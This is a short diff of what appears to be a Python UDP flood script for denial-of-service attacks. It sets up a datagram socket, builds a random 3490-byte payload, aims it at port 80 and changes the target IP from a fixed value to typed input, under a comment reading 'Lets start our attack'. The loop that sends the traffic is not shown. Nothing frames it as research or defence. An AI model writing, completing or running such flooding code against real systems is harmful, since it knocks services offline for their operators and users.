@@ -11,7 +11,7 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(3490)
 
 #Type your ip and port number (find IP address using nslookup or any online website) 
-ip = (ip_address)
+ip = input("ip:""")
 port = eval("80")
 
 #Lets start our attack
